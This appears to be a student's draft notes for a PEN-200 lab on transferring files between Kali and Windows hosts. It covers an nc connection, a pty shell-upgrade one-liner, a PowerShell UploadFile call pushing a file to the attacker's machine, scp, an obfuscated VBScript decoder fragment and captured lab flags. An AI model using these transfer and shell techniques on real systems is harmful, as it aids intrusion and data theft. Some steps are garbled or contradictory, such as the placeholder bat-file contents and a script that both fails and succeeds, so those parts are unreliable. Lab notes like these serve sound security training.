---
title: 'PEN-200 Lab: File Transfer with Windows Hosts'
aliases: []
tags:
- topic/offsec-labs
- topic/pentest
category: study_notes
status: draft
date_created: '2026-08-27'
date_modified: '2026-08-27'
source: lab.md
related_tools:
- '[[nc]]'
- '[[python]]'
- '[[python3]]'
- '[[Invoke-WebRequest]]'
- '[[TFTP]]'
- '[[get]]'
- '[[New-Object]]'
- '[[System.Net.WebClient]]'
- '[[uploadFile]]'
- '[[cp]]'
- '[[ssh]]'
- '[[ftp-1787747806]]'
- '[[try-harder-ftp-service]]'
- '[[flag2hex.exe]]'
- '[[so-basic.vbs]]'
- '[[start.sh]]'
related_techniques: []
related_tactics:
- '[[discovery]]'
- '[[execution]]'
related_services:
- '[[ftp]]'
- '[[ssh]]'
related_os:
- '[[C:\]]'
- '[[C:\Users\student\Desktop\so-basic.vbs]]'
- '[[C:\Users\student\Desktop\flag.txt]]'
related_notes: []
mitre_tactic: ''
mitre_technique: ''
real_path: ''
port: ''
protocol: ''
os: ''
---

# PEN-200 Lab: File Transfer with Windows Hosts

## Description
These exercises are part of the PEN-200 course and are designed to be performed on both Kali and Windows lab client machines, as well as on the Topic Exercises VMs. The tasks involve transferring files between the two operating systems using various methods, including VBScript, PowerShell, TFTP, and FTP. Additionally, one of the exercises involves running a program on a target VM to obtain a flag.

The process involves creating a bat file and running a script to obtain a flag. The script, `so-basic.vbs`, is obfuscated and contains a base64 encoded string that needs to be decoded to reveal the flag. However, there is an error in the script that prevents it from functioning correctly.

The process involved uninstalling pure-ftp and then running a series of commands to set up a basic VBScript on the remote machine. The VBScript, named `so-basic.vbs`, was copied to the desktop and executed using `cscript`. After execution, a `flag.txt` file was created, and its contents were displayed.

## Exercises
1. Use VBScript to transfer files in a non-interactive shell from Kali to Windows.
2. Use PowerShell to transfer files in a non-interactive shell from Kali to Windows and vice versa.
3. Use the `Invoke-WebRequest` cmdlet in PowerShell (version 3 and above) to perform both upload and download requests to the Kali machine.
4. Use TFTP to transfer files from a non-interactive shell from Kali to Windows.
5. Transfer a program from a target VM to a Kali machine using SSH and execute it to get a flag.
6. Download a file from a target VM, upload it to a Kali machine, and execute it to get a flag.
7. Download a file from a target VM, set up an FTP service on a Kali machine, and download the file to verify the completion of the tasks to get a flag.

## Exercise 5 - GLaDOP Program
On the target VM #1, use the `nc` command to establish a connection to port 5000 and launch the GLaDOP program to solve the challenge and get the flag.
```shell
nc -C 192.168.125.52 5000
```
After obtaining an interactive shell, use the following commands to set up the environment and launch the GLaDOP program:
```shell
stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
python3 -c 'import pty; pty.spawn("/bin/bash")'
student@0681ded2f964:/challenge$ get
```

## Exercise 6 - PowerShell Upload
On the target VM #2, use PowerShell to upload a program to the Kali machine and execute it to get the flag.
```shell
add upload.php to the /var/www/html directory
create uploads dir in /var/www
sudo chown www-data: /var/www/uploads
(New-Object System.Net.WebClient).UploadFile('http://192.168.119.125/upload.php', '/challenge/powershell-uploads')
cp powershell-uploads /home/kali/powershell-uploads
```
After uploading the file, execute it on the Kali machine to get the flag.
```
Great Job. Here is your flag: OS{78d915451b75401f798676965bd28fda}
```

## Exercise 7 - Try Harder FTP Service
On the target VM #3, download the `try-harder.mp3` file and start an FTP service on the Kali machine. Add a user `offsec` with the password `offsec` to the FTP service and copy the `try-harder.mp3` file into the FTP directory. Finally, download the file from the target VM and run the `try-harder-ftp-service` on the Kali machine to verify the completion of the tasks and get the flag.
```shell
ssh 192.168.119.121
```
After downloading the file, set up the FTP service and copy the file to the FTP directory:
```shell
mkdir /var/www/uploads
sudo chown www-data: /var/www/uploads
```
Upload the file to the Kali machine and execute the FTP service to get the flag.
```
cp try-harder.mp3 /var/www/uploads
try-harder-ftp-service
```

## File Transfer
The process of transferring a file from the target machine to the local machine using `scp` was demonstrated. The command used was:

```bash
scp -P 2222 student@$IP:/challenge/try-harder.mp3 ~/try-harder.mp3
```

## FTP Service Verification
The FTP service was verified to be running on the local machine using the following commands:

```bash
./try-harder-ftp-service
```

The service was confirmed to be listening on port 21, and the file `try-harder.mp3` was successfully downloaded using the credentials `USER offsec` and `PASS offsec`. The flag was then provided:

```
Great job. Here is your flag: 
OS{0e5f9afec8401ee5bdd409da44fbfce2}
```

## Alternative File Transfer Method
An alternative method for transferring files was mentioned, involving using `Ctrl+C/Ctrl+V` to copy the contents of `flag2hex.bat` from the Linux target machine (connected via RDP on port 5000 under VM Group #1) and generating the `flag2hex.exe` binary on the Windows client lab machine.

## Steps
1. Create a bat file and paste the following content into it:
```
123

Create a bat file and past the above contents in, an exe will be created.
```
2. Run the bat file to generate an executable (`flag2hex.exe`).
3. Execute `flag2hex.exe` to get the flag:
```
C:\Users\student>flag2hex.exe
Easy Peasy. Here is your flag:
OS{ae88614523b4159f6bc698e3b83e2df3}
```
4. Connect to the Linux target VM on VM Group #2 on port 5000 and copy the `so-basic.vbs` script to the Windows Client.
5. Run the `so-basic.vbs` script to execute the obfuscated `so-basic.exe`, which should create the flag code within the same directory as the script.

## Script Details
The `so-basic.vbs` script contains a function to decode a base64 string, but there is an error in the script that prevents it from functioning correctly. The correct base64 string should be provided to decode and obtain the flag. The script is as follows:
```
Function cDlsMeUL(wtIlnpnaCG)
        oqWGfUzbK = "<B64DECODE xmlns:dt="& Chr(34) & "urn:schemas-microsoft-com:datatypes" & Chr(34) & " " & _
                "dt:dt=" & Chr(34) & "bin.base64" & Chr(34) & ">" & _
                wtIlnpnaCG & "</B64DECODE>"
        Set lnfqveiKDoOt = CreateObject("MSXML2.DOMDocument.3.0")
        lnfqveiKDoOt.LoadXML(oqWGfUzbK)
        cDlsMeUL = lnfqveiKDoOt.selectsinglenode("B64DECODE").nodeTypedValue
        set lnfqveiKDoOt = nothing
End Function
```
Note: The `{{base64_encoded_binary}}` placeholder should contain a massive obfuscated string.

## Commands and Output
```plaintext
C:\Users\student>cd Desktop

C:\Users\student\Desktop>ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\student\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is DC08-488F

 Directory of C:\Users\student\Desktop

03/06/2023  04:38 PM    <DIR>          .
03/06/2023  04:38 PM    <DIR>          ..
03/06/2023  04:38 PM            17,811 so-basic.vbs
               1 File(s)         17,811 bytes
               2 Dir(s)   9,745,276,928 bytes free

C:\Users\student\Desktop>cscript so-basic.vbs
Microsoft (R) Windows Script Host Version 5.812
Copyright (C) Microsoft Corporation. All rights reserved.


C:\Users\student\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is DC08-488F

 Directory of C:\Users\student\Desktop

03/06/2023  04:40 PM    <DIR>          .
03/06/2023  04:40 PM    <DIR>          ..
03/06/2023  04:40 PM                78 flag.txt
03/06/2023  04:38 PM            17,811 so-basic.vbs
               2 File(s)         17,889 bytes
               2 Dir(s)   9,745,260,544 bytes free

C:\Users\student\Desktop>type flag.txt
That was so basic. Here is your flag:
OS{171cf85e666af1d7debe1b0e0d64f47d}
```

